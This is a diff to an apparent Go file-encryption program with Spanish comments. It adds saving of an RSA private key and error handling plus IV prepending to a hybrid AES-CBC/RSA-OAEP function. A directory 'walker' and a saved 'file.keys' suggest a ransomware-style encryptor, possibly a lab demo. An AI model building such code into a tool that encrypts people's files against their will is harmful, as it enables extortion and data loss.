@@ -36,6 +36,9 @@ func init() {
 	}
 	serverKey = &serverPrv.PublicKey
 
+	rmifex("server.key")
+	os.WriteFile("server.key", x509.MarshalPKCS1PrivateKey(serverPrv), 0444)
+
 	clientPrv, err := rsa.GenerateKey(rand.Reader, 1024)
 	if err != nil {
 		log.Fatal(err)
@@ -54,17 +57,41 @@ func init() {
 }
 
 func encryptHybrid(rsaKey *rsa.PublicKey, bs []byte) ([]byte, []byte) {
+	// Generar una clave simétrica aleatoria
 	k := make([]byte, 16)
-	rand.Read(k)
-	blk, _ := aes.NewCipher(k)
+	if _, err := rand.Read(k); err != nil {
+		log.Fatal(err)
+	}
+
+	// Crear el bloque AES con la clave generada
+	blk, err := aes.NewCipher(k)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	// Aplicar padding PKCS7 al mensaje
 	bs = pad(bs, blk.BlockSize())
+
+	// Generar un IV aleatorio
 	iv := make([]byte, blk.BlockSize())
-	rand.Read(iv)
+	if _, err := rand.Read(iv); err != nil {
+		log.Fatal(err)
+	}
+
+	// Encriptar usando CBC con el IV
 	enc := cipher.NewCBCEncrypter(blk, iv)
 	enc.CryptBlocks(bs, bs)
-	ek, _ := rsa.EncryptOAEP(sha256.New(), rand.Reader, rsaKey, k, nil)
+
+	// Encriptar la clave simétrica usando RSA OAEP
+	ek, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, rsaKey, k, nil)
+	if err != nil {
+		log.Fatal(err)
+	}
 	zero(k)
-	return ek, bs
+
+	// Concatena el IV al principio del ciphertext para poder recuperarlo durante la desencriptación
+	ciphertext := append(iv, bs...)
+	return ek, ciphertext
 }
 
 func pad(bs []byte, blksz int) []byte {
@@ -121,7 +148,6 @@ func main() {
 		fmt.Println("✅ file.keys guardado correctamente.")
 	}
 }
-
 
 func walker(path string, info os.FileInfo, err error) error {
 	if err != nil {
